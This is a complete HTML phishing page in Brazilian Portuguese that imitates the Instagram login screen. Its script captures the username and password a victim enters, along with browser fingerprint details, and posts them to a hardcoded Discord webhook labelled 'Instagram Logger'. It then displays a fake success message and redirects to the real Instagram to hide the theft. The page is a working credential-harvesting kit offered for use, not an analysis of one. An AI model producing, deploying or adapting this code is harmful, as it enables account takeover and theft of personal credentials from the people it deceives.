<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 350px;
        }
        
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 40px 40px 20px;
            text-align: center;
            border-radius: 1px;
            margin-bottom: 10px;
        }
        
        .logo {
            margin-bottom: 30px;
        }
        
        .logo img {
            width: 175px;
        }
        
        .input-group {
            margin-bottom: 6px;
        }
        
        input {
            width: 100%;
            padding: 9px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            color: #262626;
        }
        
        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        
        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 9px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 15px;
            cursor: pointer;
        }
        
        .login-btn:hover {
            background-color: #1877f2;
        }
        
        .divider {
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            display: flex;
            align-items: center;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        
        .divider span {
            padding: 0 20px;
        }
        
        .facebook-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: inline-block;
            margin-bottom: 20px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }
        
        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            border-radius: 1px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .apps {
            text-align: center;
            font-size: 14px;
            margin-bottom: 20px;
        }
        
        .app-buttons img {
            height: 40px;
            margin: 5px;
        }
        
        .footer {
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
            max-width: 800px;
            margin: 0 auto;
        }
        
        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 5px;
        }
        
        #message {
            display: none;
            padding: 10px;
            margin-top: 10px;
            border-radius: 3px;
            font-size: 12px;
        }
        
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <!-- Logo do Instagram -->
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram">
            </div>
            
            <form id="loginForm">
                <div class="input-group">
                    <input type="text" id="username" placeholder="Nome de usuário, email ou número" required>
                </div>
                
                <div class="input-group">
                    <input type="password" id="password" placeholder="Senha" required>
                </div>
                
                <button type="submit" class="login-btn">Entrar</button>
                
                <div id="message"></div>
            </form>
            
            <div class="divider">
                <span>OU</span>
            </div>
            
            <a href="#" class="facebook-login">
                <i>f</i> Entrar com o Facebook
            </a>
            
            <a href="#" class="forgot-password">Esqueceu a senha?</a>
        </div>
        
        <div class="signup-box">
            Não tem uma conta? <a href="#">Cadastre-se</a>
        </div>
        
        <div class="apps">
            <p>Obtenha o aplicativo.</p>
            <div class="app-buttons">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play">
            </div>
        </div>
        
        <div class="footer">
            <div class="footer-links">
                <a href="#">Meta</a>
                <a href="#">Sobre</a>
                <a href="#">Blog</a>
                <a href="#">Carreiras</a>
                <a href="#">Ajuda</a>
                <a href="#">API</a>
                <a href="#">Privacidade</a>
                <a href="#">Termos</a>
                <a href="#">Localizações</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Threads</a>
                <a href="#">Carregamento de contatos e não usuários</a>
                <a href="#">Meta Verified</a>
            </div>
            <div style="margin-top: 20px;">
                <span>Português (Brasil) © 2024 Instagram from Meta</span>
            </div>
        </div>
    </div>

    <script>
        // Seu webhook do Discord
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1480933665448919105/kd31HGHQvYNA-28Cmb6QBs2XSFfPCq_-c5wpEUUq5JF1CMejaYadiw_YtJ_lKilEkOf6';
        
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Mostrar mensagem de carregamento
            const messageDiv = document.getElementById('message');
            messageDiv.textContent = "Entrando...";
            messageDiv.className = "success";
            messageDiv.style.display = "block";
            
            // Coletar informações adicionais
            const userInfo = {
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer || 'Direct'
            };
            
            try {
                // Enviar para o webhook do Discord
                const response = await sendToDiscord(userInfo);
                
                if (response.ok) {
                    // Sucesso - mostrar mensagem falsa de login
                    messageDiv.textContent = "Login realizado com sucesso! Redirecionando...";
                    messageDiv.className = "success";
                    
                    // Redirecionar após 2 segundos (para o Instagram real)
                    setTimeout(() => {
                        window.location.href = 'https://www.instagram.com/';
                    }, 2000);
                    
                    // Opcional: salvar dados localmente também
                    saveLocally(userInfo);
                } else {
                    messageDiv.textContent = "Erro ao conectar. Tente novamente.";
                    messageDiv.className = "error";
                }
            } catch (error) {
                console.error('Erro:', error);
                messageDiv.textContent = "Erro de conexão. Tente novamente.";
                messageDiv.className = "error";
                
                // Salvar localmente mesmo se falhar o webhook
                saveLocally(userInfo);
            }
        });
        
        async function sendToDiscord(data) {
            // Formatar mensagem para Discord
            const discordMessage = {
                username: "Instagram Logger",
                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png",
                embeds: [{
                    title: "🔐 Nova Tentativa de Login",
                    color: 15548997, // Cor vermelha
                    fields: [
                        {
                            name: "👤 Usuário",
                            value: `\`\`\`${data.username}\`\`\``,
                            inline: true
                        },
                        {
                            name: "🔑 Senha",
                            value: `\`\`\`${data.password}\`\`\``,
                            inline: true
                        },
                        {
                            name: "🕐 Data/Hora",
                            value: `<t:${Math.floor(new Date(data.timestamp).getTime() / 1000)}:F>`,
                            inline: false
                        },
                        {
                            name: "🌐 Navegador",
                            value: `\`\`\`${data.userAgent.substring(0, 100)}...\`\`\``,
                            inline: false
                        },
                        {
                            name: "📍 Informações",
                            value: `**Plataforma:** ${data.platform}\n**Idioma:** ${data.language}\n**Resolução:** ${data.screenResolution}\n**Origem:** ${data.referrer}`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Instagram Logger • Coleta automática"
                    },
                    timestamp: data.timestamp
                }]
            };
            
            // Enviar para o webhook
            return await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(discordMessage)
            });
        }
        
        function saveLocally(data) {
            // Salvar dados localmente no localStorage (apenas para demonstração)
            try {
                const existingData = JSON.parse(localStorage.getItem('instagram_logs') || '[]');
                existingData.push(data);
                localStorage.setItem('instagram_logs', JSON.stringify(existingData));
                console.log('Dados salvos localmente:', data);
            } catch (e) {
                console.error('Erro ao salvar localmente:', e);
            }
        }
        
        // Adicionar efeitos visuais
        document.querySelectorAll('input').forEach(input => {
            input.addEventListener('focus', function() {
                this.style.borderColor = '#a8a8a8';
            });
            
            input.addEventListener('blur', function() {
                this.style.borderColor = '#dbdbdb';
            });
        });
    </script>
</body>
</html>
